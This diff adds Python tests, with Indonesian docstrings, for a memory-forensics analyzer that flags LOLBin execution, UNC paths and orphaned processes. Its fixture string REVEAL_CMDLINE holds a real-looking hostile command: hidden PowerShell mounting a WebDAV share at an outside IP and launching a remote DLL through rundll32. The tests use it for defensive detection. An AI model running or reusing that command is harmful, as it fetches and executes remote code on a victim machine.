@@ -711,6 +711,66 @@ def test_startup_folder_is_flagged_not_only_temp():
     assert flagged[0]["confidence"] == "MEDIUM"
 
 
+REVEAL_CMDLINE = (r"powershell.exe  -windowstyle hidden net use "
+                  r"\\45.9.74.32@8888\davwwwroot\ ; "
+                  r"rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry")
+
+
+def test_lolbin_detected_inside_command_line():
+    """
+    LOLBin yang dipakai bisa disebut DI DALAM command line, bukan sebagai nama
+    proses. Proses yang terdaftar powershell.exe, tapi yang mengeksekusi muatan
+    tahap kedua adalah rundll32 -- dan sub-technique MITRE-nya ikut yang kedua.
+    """
+    from backend.services.memory_analyzer import find_lolbin_execution
+    hits = find_lolbin_execution([
+        {"PID": 3692, "Process": "powershell.exe", "Args": REVEAL_CMDLINE}])
+    techniques = {h["mitre_technique"] for h in hits}
+    assert "T1218.011" in techniques, f"rundll32 terlewat: {techniques}"
+    assert "T1059.001" in techniques, "powershell sendiri juga harus tercatat"
+    rundll = next(h for h in hits if h["mitre_technique"] == "T1218.011")
+    assert rundll["invocation"] == "dipanggil di dalam command line"
+
+
+def test_lolbin_targets_exclude_the_utility_itself():
+    """
+    Tanpa penyaringan, 'rundll32 ... 3435.dll' dilaporkan seolah rundll32
+    menjalankan powershell.exe -- nama prosesnya sendiri ikut jadi 'muatan'.
+    """
+    from backend.services.memory_analyzer import find_lolbin_execution
+    hits = find_lolbin_execution([
+        {"PID": 3692, "Process": "powershell.exe", "Args": REVEAL_CMDLINE}])
+    for hit in hits:
+        names = [t.rsplit("\\", 1)[-1].lower() for t in hit["targets"]]
+        assert "powershell.exe" not in names
+        assert "rundll32.exe" not in names
+        assert any(n == "3435.dll" for n in names), hit["targets"]
+
+
+def test_unc_path_splits_host_and_share():
+    """Nama share dan host adalah dua IOC berbeda, keduanya bisa dicari di jaringan."""
+    from backend.services.memory_analyzer import extract_unc_paths
+    found = extract_unc_paths([{"PID": 1, "Process": "powershell.exe",
+                                "Args": REVEAL_CMDLINE}])
+    shares = {f["share"] for f in found}
+    hosts = {f["host"] for f in found}
+    assert "davwwwroot" in shares, shares
+    assert "45.9.74.32@8888" in hosts, hosts
+
+
+def test_process_tree_reports_missing_parent():
+    """'PPID 4120' tak berarti apa-apa sendirian; induk yang sudah hilang itu temuan."""
+    from backend.services.memory_analyzer import build_process_tree
+    tree = build_process_tree([
+        {"PID": 3692, "PPID": 4120, "ImageFileName": "powershell.exe"},
+        {"PID": 900, "PPID": 3692, "ImageFileName": "child.exe"},
+    ], owners={3692: {"user": "Elon"}})
+    ps = next(t for t in tree if t["pid"] == 3692)
+    assert ps["parent_exists"] is False and ps["user"] == "Elon"
+    child = next(t for t in tree if t["pid"] == 900)
+    assert "powershell.exe (3692)" in child["ancestry"]
+
+
 def test_reverse_shell_to_private_ip_not_filtered_out():
     """
     Regresi: menyaring koneksi hanya ke "IP eksternal" menyembunyikan temuan
